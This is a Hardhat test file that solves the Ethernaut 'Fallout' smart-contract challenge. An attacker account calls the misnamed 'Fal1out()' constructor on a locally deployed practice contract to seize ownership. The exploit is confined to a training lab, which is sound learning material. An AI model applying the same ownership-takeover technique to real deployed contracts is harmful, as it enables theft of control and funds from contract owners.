import { expect } from "chai";
import { ethers } from "hardhat";

describe("Ethernaut Level 2 - Fallout", function () {
  it("should claim ownership by calling the misnamed constructor", async () => {
    const [deployer, attacker] = await ethers.getSigners();

    const FalloutFactory = await ethers.getContractFactory("Fallout");
    const fallout = await FalloutFactory.deploy();
    await fallout.waitForDeployment();

    const falloutAddress = await fallout.getAddress();

    // Call the misnamed constructor: Fal1out()
    const fal1outData = fallout.interface.encodeFunctionData("Fal1out");
    await attacker.sendTransaction({
      to: falloutAddress,
      data: fal1outData,
      value: 0n,
    });

    // Confirm attacker is now the owner
    const owner: string = await fallout.getFunction("owner").staticCall();
    expect(owner).to.equal(attacker.address);
  });
});
